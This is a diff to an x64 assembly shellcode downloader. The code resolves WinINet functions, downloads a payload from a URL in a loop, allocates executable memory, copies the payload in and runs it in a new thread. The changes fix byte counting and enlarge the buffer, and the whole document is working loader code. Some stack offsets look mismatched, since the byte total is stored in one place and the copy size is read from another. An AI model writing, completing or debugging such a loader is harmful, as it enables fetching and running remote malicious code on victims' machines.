@@ -1,5 +1,7 @@
 ;nasm -fwin64 [x64findkernel32.asm]
 ;x86_64-w64-mingw32-gcc downloader.obj -o downloader.exe
+; or
+; ld.exe -m i386pep -N -o downloader.exe downloader.obj
 
 BITS 64
 
@@ -261,7 +263,7 @@ continuation:
     ;call RtlMoveMemory
     call r9
 
-   add rsp, 88
+    add rsp, 88
 
  ; ---- InternetOpenUrlA ----
     mov rcx, rdi                     ; hInternet
@@ -274,35 +276,38 @@ continuation:
     add rsp, 0x28
     push rax                       ; hUrl
     mov rsi, [rsp]                 ; hUrl handle for closing
+	
+	xor rbx, rbx
 read_loop:
     ; ---- InternetReadFile ----
     mov rcx, [rsp]                   ; HINTERNET hUrl
-    mov rdx, r15                  ; LPVOID lpBuffer
-    mov r8d, 4096                     ; DWORD dwNumberOfBytesToRead
-    lea r9, dword [rsp-0x30]               ; LPDWORD lpdwNumberOfBytesRead
-    xor rax, rax
+    lea rdx, [r15 + rbx]             ; LPVOID lpBuffer + offset
+    mov r8d, 4096                    ; DWORD dwNumberOfBytesToRead
+    lea r9, [rsp+0x40]               ; LPDWORD lpdwNumberOfBytesRead
     call r13
-    test eax, eax
-    je read_done
-    cmp dword [rsp-0x30], 0
-    jbe read_done
     
-
-    mov ecx, dword [rsp-0x30]        ; load the DWORD from [r9] into ECX (the total bytes for our shellcode!)
-    mov [rsp-0x40], ecx             ; store that value into totalBytes
-
+    test eax, eax                    ; Check if InternetReadFile succeeded
+    je read_done
+    
+    mov ecx, dword [rsp+0x40]        ; Bytes read THIS iteration
+    test ecx, ecx                    ; Check if 0 bytes (EOF)
+    jz read_done
+    
+    add rbx, rcx                     ; Accumulate total bytes
     jmp read_loop
-
+    
 read_done:
-; ---- Close handles ----
-    mov rcx, rsi ;hUrl
+    mov [rsp-0x50], ebx              ; Store total bytes downloaded
+	
+    ; ---- Close handles ----
+    mov rcx, rsi                     ; hUrl
     call r12
-    mov rcx, rdi ;hInternet
+    mov rcx, rdi                     ; hInternet
     call r12
 
 ; ---- Allocate memory ----
     mov rcx, 0                    ; LPVOID lpAddress = NULL
-    mov rdx, 0x5000               ; SIZE_T dwSize = 20 KB for shellcode
+    mov rdx, 0x10000               ; SIZE_T dwSize = 64 KB for shellcode
     mov r8d, 0x3000               ; MEM_COMMIT | MEM_RESERVE
     mov r9d, 0x40                 ; PAGE_READWRITE_EXECUTE
     mov rax, [rsp + 22*8]
@@ -314,18 +319,18 @@ read_done:
     ; Example: single chunk
     pop rcx                      ; destination
     mov rdx, r15                 ; source
-    mov r8d, 1000                  ; size
+    mov r8d, dword [rsp-0x10]    ; size
     mov rax, [rsp + 21*8]
     call rax                     ;RtlMoveMemory
     push rax
     ; ---- Create thread ----
    xor rcx, rcx                ; lpThreadAttributes = NULL
    xor rdx, rdx                ; dwStackSize = 0
-   pop r8                 ; rsi (example) holds shellcode pointer
+   pop r8                      ; rsi (example) holds shellcode pointer
    xor r9, r9                  ; lpParameter = NULL
-   mov dword [rsp+0x20], 0      ; dwCreationFlags = 0
-   mov qword [rsp+0x28], 0      ; lpThreadId = NULL
-   mov rax, [rsp+0x88]          ; rax = pointer to CreateThread
+   mov dword [rsp+0x20], 0     ; dwCreationFlags = 0
+   mov qword [rsp+0x28], 0     ; lpThreadId = NULL
+   mov rax, [rsp+0x88]         ; rax = pointer to CreateThread
    call rax
 
     ; ---- Wait for shellcode ----
